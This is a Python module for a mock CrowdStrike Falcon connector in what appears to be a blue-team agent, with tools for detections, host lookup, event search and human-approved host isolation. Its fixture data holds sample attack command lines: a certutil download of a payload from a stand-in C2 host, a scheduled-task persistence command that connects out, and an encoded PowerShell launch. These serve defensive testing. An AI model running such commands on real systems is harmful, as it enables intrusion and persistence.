"""CrowdStrike Falcon MCP server connector.

Tools:
- cs_get_detections(limit, severity)
- cs_host_details(hostname)
- cs_isolate_host(hostname)  -- requires HITL approval
- cs_search_events(query, timeframe)

Mock mode returns realistic CrowdStrike detection payloads, host details,
and event search results.
"""

from __future__ import annotations

import logging
import os
from typing import Any

from langchain_core.tools import tool

logger = logging.getLogger("btagent.mcp.servers.crowdstrike")

MOCK_MODE = (
    os.getenv("BTAGENT_MOCK_CONNECTORS", "true").lower() == "true"
)


# ---------------------------------------------------------------------------
# Mock data
# ---------------------------------------------------------------------------

_MOCK_DETECTIONS = [
    {
        "detection_id": "ldt:abcdef123456:1001",
        "cid": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
        "created_timestamp": "2026-03-26T08:21:50Z",
        "max_severity": 90,
        "max_severity_displayname": "Critical",
        "status": "new",
        "assigned_to_name": None,
        "hostname": "WS-JSMITH-PC",
        "device_id": "dev_01HXR4ABCDEF1234567890",
        "tactic": "Execution",
        "tactic_id": "TA0002",
        "technique": "PowerShell",
        "technique_id": "T1059.001",
        "behaviors": [
            {
                "behavior_id": "beh_01HXR4ABCDEF_001",
                "filename": "powershell.exe",
                "filepath": (
                    "C:\\Windows\\System32\\"
                    "WindowsPowerShell\\v1.0\\powershell.exe"
                ),
                "cmdline": (
                    "powershell.exe -enc "
                    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."
                ),
                "parent_details": {
                    "parent_process_graph_id": "pid:dev01:6140",
                    "parent_cmdline": (
                        'cmd.exe /c "start /b powershell -enc ..."'
                    ),
                    "parent_image_filename": "cmd.exe",
                },
                "user_name": "ACME\\jsmith",
                "sha256": (
                    "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
                    "e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
                ),
                "ioc_type": "sha256",
                "severity": 90,
                "confidence": 95,
                "pattern_disposition": 2048,
                "pattern_disposition_details": {
                    "detect": True,
                    "prevent": False,
                    "indicator": True,
                },
                "tactic": "Execution",
                "technique": "PowerShell",
                "timestamp": "2026-03-26T08:22:05Z",
            },
        ],
    },
    {
        "detection_id": "ldt:abcdef123456:1002",
        "cid": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
        "created_timestamp": "2026-03-26T07:55:30Z",
        "max_severity": 70,
        "max_severity_displayname": "High",
        "status": "new",
        "assigned_to_name": None,
        "hostname": "WS-JSMITH-PC",
        "device_id": "dev_01HXR4ABCDEF1234567890",
        "tactic": "Defense Evasion",
        "tactic_id": "TA0005",
        "technique": "Obfuscated Files or Information",
        "technique_id": "T1027",
        "behaviors": [
            {
                "behavior_id": "beh_01HXR4ABCDEF_002",
                "filename": "certutil.exe",
                "filepath": (
                    "C:\\Windows\\System32\\certutil.exe"
                ),
                "cmdline": (
                    "certutil.exe -urlcache -split -f "
                    "https://evil-c2.example.com/payload.bin "
                    "C:\\Users\\jsmith\\AppData\\"
                    "Local\\Temp\\svchost.exe"
                ),
                "parent_details": {
                    "parent_process_graph_id": "pid:dev01:7284",
                    "parent_cmdline": (
                        "powershell.exe -enc ..."
                    ),
                    "parent_image_filename": "powershell.exe",
                },
                "user_name": "ACME\\jsmith",
                "sha256": (
                    "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6"
                    "b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"
                ),
                "ioc_type": "sha256",
                "severity": 70,
                "confidence": 85,
                "pattern_disposition": 16,
                "pattern_disposition_details": {
                    "detect": True,
                    "prevent": False,
                    "indicator": True,
                },
                "tactic": "Defense Evasion",
                "technique": "Obfuscated Files or Information",
                "timestamp": "2026-03-26T07:55:28Z",
            },
        ],
    },
    {
        "detection_id": "ldt:abcdef123456:1003",
        "cid": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
        "created_timestamp": "2026-03-26T06:12:00Z",
        "max_severity": 50,
        "max_severity_displayname": "Medium",
        "status": "new",
        "assigned_to_name": None,
        "hostname": "SRV-DB-02",
        "device_id": "dev_01HXR4GHIJKL5678901234",
        "tactic": "Persistence",
        "tactic_id": "TA0003",
        "technique": "Scheduled Task/Job",
        "technique_id": "T1053.005",
        "behaviors": [
            {
                "behavior_id": "beh_01HXR4GHIJKL_001",
                "filename": "schtasks.exe",
                "filepath": (
                    "C:\\Windows\\System32\\schtasks.exe"
                ),
                "cmdline": (
                    "schtasks /create /sc minute /mo 15 "
                    '/tn "SystemHealthCheck" '
                    "/tr \"C:\\ProgramData\\svchost.exe "
                    '-connect 198.51.100.23:443"'
                ),
                "parent_details": {
                    "parent_process_graph_id": "pid:dev02:3204",
                    "parent_cmdline": (
                        "cmd.exe /c schtasks ..."
                    ),
                    "parent_image_filename": "cmd.exe",
                },
                "user_name": "ACME\\svc_backup",
                "sha256": (
                    "c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8"
                    "a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4"
                ),
                "ioc_type": "sha256",
                "severity": 50,
                "confidence": 70,
                "pattern_disposition": 2048,
                "pattern_disposition_details": {
                    "detect": True,
                    "prevent": False,
                    "indicator": True,
                },
                "tactic": "Persistence",
                "technique": "Scheduled Task/Job",
                "timestamp": "2026-03-26T06:11:55Z",
            },
        ],
    },
]

_MOCK_HOST_DETAILS: dict[str, dict[str, Any]] = {
    "WS-JSMITH-PC": {
        "device_id": "dev_01HXR4ABCDEF1234567890",
        "hostname": "WS-JSMITH-PC",
        "local_ip": "10.1.42.17",
        "external_ip": "203.0.113.50",
        "mac_address": "AA:BB:CC:DD:EE:01",
        "os_version": "Windows 11 Enterprise 23H2",
        "os_build": "22631.3296",
        "platform_name": "Windows",
        "system_manufacturer": "Dell Inc.",
        "system_product_name": "Latitude 5540",
        "bios_version": "1.24.0",
        "agent_version": "7.14.17706.0",
        "agent_load_flags": "1",
        "first_seen": "2025-09-15T09:30:00Z",
        "last_seen": "2026-03-26T08:25:00Z",
        "status": "normal",
        "containment_status": "normal",
        "groups": ["Workstations", "Engineering", "US-East"],
        "policies": [
            {
                "policy_type": "prevention",
                "policy_id": "pol_prev_01",
                "applied": True,
            },
            {
                "policy_type": "sensor_update",
                "policy_id": "pol_su_01",
                "applied": True,
            },
        ],
        "tags": [
            "department:engineering",
            "location:us-east-1",
        ],
        "reduced_functionality_mode": "no",
        "network_interfaces": [
            {
                "interface_name": "Ethernet",
                "local_address": "10.1.42.17",
                "mac_address": "AA:BB:CC:DD:EE:01",
            },
        ],
        "logged_in_users": ["ACME\\jsmith"],
    },
    "SRV-DB-02": {
        "device_id": "dev_01HXR4GHIJKL5678901234",
        "hostname": "SRV-DB-02",
        "local_ip": "10.2.10.54",
        "external_ip": "203.0.113.51",
        "mac_address": "AA:BB:CC:DD:EE:02",
        "os_version": "Windows Server 2022 Datacenter",
        "os_build": "20348.2340",
        "platform_name": "Windows",
        "system_manufacturer": "VMware, Inc.",
        "system_product_name": "VMware Virtual Platform",
        "bios_version": "6.00",
        "agent_version": "7.14.17706.0",
        "first_seen": "2024-06-01T14:00:00Z",
        "last_seen": "2026-03-26T08:20:00Z",
        "status": "normal",
        "containment_status": "normal",
        "groups": ["Servers", "Database", "US-East"],
        "policies": [
            {
                "policy_type": "prevention",
                "policy_id": "pol_prev_srv",
                "applied": True,
            },
        ],
        "tags": [
            "role:database",
            "env:production",
            "location:us-east-1",
        ],
        "reduced_functionality_mode": "no",
        "logged_in_users": ["ACME\\svc_backup"],
    },
}

_MOCK_EVENTS = [
    {
        "event_id": "evt_cs_001",
        "timestamp": "2026-03-26T08:22:05Z",
        "event_type": "ProcessRollup2",
        "hostname": "WS-JSMITH-PC",
        "user_name": "ACME\\jsmith",
        "filename": "powershell.exe",
        "cmdline": (
            "powershell.exe -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."
        ),
        "parent_image_filename": "cmd.exe",
        "sha256": (
            "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
            "e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
        ),
        "source_ip": "10.1.42.17",
    },
    {
        "event_id": "evt_cs_002",
        "timestamp": "2026-03-26T07:55:28Z",
        "event_type": "ProcessRollup2",
        "hostname": "WS-JSMITH-PC",
        "user_name": "ACME\\jsmith",
        "filename": "certutil.exe",
        "cmdline": (
            "certutil.exe -urlcache -split -f "
            "https://evil-c2.example.com/payload.bin ..."
        ),
        "parent_image_filename": "powershell.exe",
        "sha256": (
            "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6"
            "b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"
        ),
        "source_ip": "10.1.42.17",
    },
    {
        "event_id": "evt_cs_003",
        "timestamp": "2026-03-26T08:23:12Z",
        "event_type": "DnsRequest",
        "hostname": "WS-JSMITH-PC",
        "user_name": "ACME\\jsmith",
        "domain_name": "evil-c2.example.com",
        "request_type": "A",
        "resolved_ip": "198.51.100.23",
        "source_ip": "10.1.42.17",
    },
    {
        "event_id": "evt_cs_004",
        "timestamp": "2026-03-26T08:24:01Z",
        "event_type": "NetworkConnect",
        "hostname": "WS-JSMITH-PC",
        "user_name": "ACME\\jsmith",
        "remote_address": "198.51.100.23",
        "remote_port": 443,
        "local_address": "10.1.42.17",
        "local_port": 51432,
        "protocol": "TCP",
        "filename": "svchost.exe",
        "source_ip": "10.1.42.17",
    },
]


# ---------------------------------------------------------------------------
# CrowdStrike MCP server class
# ---------------------------------------------------------------------------
class CrowdStrikeMCPServer:
    """CrowdStrike Falcon MCP connector with mock and real modes."""

    server_id: str = "crowdstrike"

    def __init__(self, *, mock_mode: bool | None = None) -> None:
        self.mock_mode = (
            mock_mode if mock_mode is not None else MOCK_MODE
        )

    # ---- tools ----

    async def cs_get_detections(
        self,
        limit: int = 50,
        severity: str = "all",
    ) -> dict[str, Any]:
        """Retrieve CrowdStrike Falcon detections.

        Args:
            limit: Maximum detections to return.
            severity: Filter (critical|high|medium|low|all).

        Returns:
            Detection payloads with behaviors, IOCs, MITRE mappings.
        """
        if self.mock_mode:
            return self._mock_get_detections(limit, severity)
        return self._real_get_detections(limit, severity)

    async def cs_host_details(
        self,
        hostname: str,
    ) -> dict[str, Any]:
        """Get detailed host info from CrowdStrike Falcon.

        Args:
            hostname: The hostname to look up.

        Returns:
            Host details (OS, agent, network, policies, status).
        """
        if self.mock_mode:
            return self._mock_host_details(hostname)
        return self._real_host_details(hostname)

    async def cs_isolate_host(
        self,
        hostname: str,
    ) -> dict[str, Any]:
        """Isolate a host via CrowdStrike network containment.

        IMPORTANT: This is a containment action that requires HITL
        approval before execution.

        Args:
            hostname: The hostname to isolate.

        Returns:
            Containment action result.
        """
        if self.mock_mode:
            return self._mock_isolate_host(hostname)
        return self._real_isolate_host(hostname)

    async def cs_search_events(
        self,
        query: str,
        timeframe: str = "24h",
    ) -> dict[str, Any]:
        """Search CrowdStrike event telemetry.

        Args:
            query: Search query (hostname, IP, hash, filename).
            timeframe: Time window (e.g. 1h, 24h, 7d).

        Returns:
            Matching events from Falcon telemetry.
        """
        if self.mock_mode:
            return self._mock_search_events(query, timeframe)
        return self._real_search_events(query, timeframe)

    # ---- mock implementations ----

    def _mock_get_detections(
        self, limit: int, severity: str
    ) -> dict[str, Any]:
        if severity == "all":
            detections = _MOCK_DETECTIONS[:limit]
        else:
            sev_map = {
                "critical": 90,
                "high": 70,
                "medium": 50,
                "low": 30,
            }
            min_sev = sev_map.get(severity.lower(), 0)
            detections = [
                d
                for d in _MOCK_DETECTIONS
                if d["max_severity"] >= min_sev
            ][:limit]
        return {
            "status": "success",
            "total": len(detections),
            "detections": detections,
            "is_mock": True,
        }

    def _mock_host_details(self, hostname: str) -> dict[str, Any]:
        host = _MOCK_HOST_DETAILS.get(hostname)
        if host:
            return {
                "status": "success",
                "host": host,
                "is_mock": True,
            }
        return {
            "status": "not_found",
            "message": (
                f"Host '{hostname}' not found in CrowdStrike"
            ),
            "is_mock": True,
        }

    def _mock_isolate_host(self, hostname: str) -> dict[str, Any]:
        host = _MOCK_HOST_DETAILS.get(hostname)
        if host is None:
            return {
                "status": "error",
                "message": f"Host '{hostname}' not found",
                "is_mock": True,
            }
        return {
            "status": "success",
            "action": "network_contain",
            "hostname": hostname,
            "device_id": host["device_id"],
            "containment_status": "contained",
            "message": (
                f"Host '{hostname}' has been network-contained. "
                "The Falcon agent remains operational for "
                "remote investigation."
            ),
            "requires_hitl": True,
            "is_mock": True,
        }

    def _mock_search_events(
        self, query: str, timeframe: str
    ) -> dict[str, Any]:
        q_lower = query.lower()
        events = [
            e for e in _MOCK_EVENTS if q_lower in str(e).lower()
        ]
        if not events:
            events = _MOCK_EVENTS
        return {
            "status": "success",
            "query": query,
            "timeframe": timeframe,
            "total": len(events),
            "events": events,
            "is_mock": True,
        }

    # ---- real implementations (placeholders) ----

    def _real_get_detections(
        self, limit: int, severity: str
    ) -> dict[str, Any]:
        raise NotImplementedError(
            "Real CrowdStrike detections not yet implemented"
        )

    def _real_host_details(self, hostname: str) -> dict[str, Any]:
        raise NotImplementedError(
            "Real CrowdStrike host details not yet implemented"
        )

    def _real_isolate_host(self, hostname: str) -> dict[str, Any]:
        raise NotImplementedError(
            "Real CrowdStrike isolation not yet implemented"
        )

    def _real_search_events(
        self, query: str, timeframe: str
    ) -> dict[str, Any]:
        raise NotImplementedError(
            "Real CrowdStrike event search not yet implemented"
        )

    # ---- tool metadata ----

    def get_tool_metadata(self) -> list[dict[str, Any]]:
        return [
            {
                "name": "cs_get_detections",
                "description": (
                    "Retrieve CrowdStrike Falcon detections with "
                    "behaviors, IOCs, and MITRE ATT&CK mappings."
                ),
                "server_id": self.server_id,
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "limit": {
                            "type": "integer",
                            "description": (
                                "Maximum detections to return"
                            ),
                            "default": 50,
                        },
                        "severity": {
                            "type": "string",
                            "enum": [
                                "critical",
                                "high",
                                "medium",
                                "low",
                                "all",
                            ],
                            "default": "all",
                        },
                    },
                },
            },
            {
                "name": "cs_host_details",
                "description": (
                    "Get detailed host information from "
                    "CrowdStrike Falcon including OS, agent "
                    "version, network, policies."
                ),
                "server_id": self.server_id,
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "hostname": {
                            "type": "string",
                            "description": "Hostname to look up",
                        },
                    },
                    "required": ["hostname"],
                },
            },
            {
                "name": "cs_isolate_host",
                "description": (
                    "Isolate a host via CrowdStrike Falcon "
                    "network containment. "
                    "REQUIRES HITL APPROVAL."
                ),
                "server_id": self.server_id,
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "hostname": {
                            "type": "string",
                            "description": (
                                "Hostname to isolate"
                            ),
                        },
                    },
                    "required": ["hostname"],
                },
            },
            {
                "name": "cs_search_events",
                "description": (
                    "Search CrowdStrike Falcon event telemetry "
                    "by hostname, IP, hash, or filename."
                ),
                "server_id": self.server_id,
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "query": {
                            "type": "string",
                            "description": "Search query",
                        },
                        "timeframe": {
                            "type": "string",
                            "description": (
                                "Time window (e.g. 1h, 24h, 7d)"
                            ),
                            "default": "24h",
                        },
                    },
                    "required": ["query"],
                },
            },
        ]


# ---------------------------------------------------------------------------
# Module-level LangChain tool instances
# ---------------------------------------------------------------------------
_server = CrowdStrikeMCPServer()


@tool
async def cs_get_detections(
    limit: int = 50,
    severity: str = "all",
) -> dict[str, Any]:
    """Retrieve CrowdStrike Falcon detections.

    Args:
        limit: Maximum number of detections to return.
        severity: Filter (critical, high, medium, low, all).
    """
    return await _server.cs_get_detections(limit, severity)


@tool
async def cs_host_details(hostname: str) -> dict[str, Any]:
    """Get detailed host info from CrowdStrike Falcon.

    Args:
        hostname: The hostname to look up.
    """
    return await _server.cs_host_details(hostname)


@tool
async def cs_isolate_host(hostname: str) -> dict[str, Any]:
    """Isolate a host via CrowdStrike. Requires HITL approval.

    Args:
        hostname: The hostname to isolate.
    """
    return await _server.cs_isolate_host(hostname)


@tool
async def cs_search_events(
    query: str,
    timeframe: str = "24h",
) -> dict[str, Any]:
    """Search CrowdStrike Falcon event telemetry.

    Args:
        query: Search query (hostname, IP, hash, filename).
        timeframe: Time window (e.g. 1h, 24h, 7d).
    """
    return await _server.cs_search_events(query, timeframe)
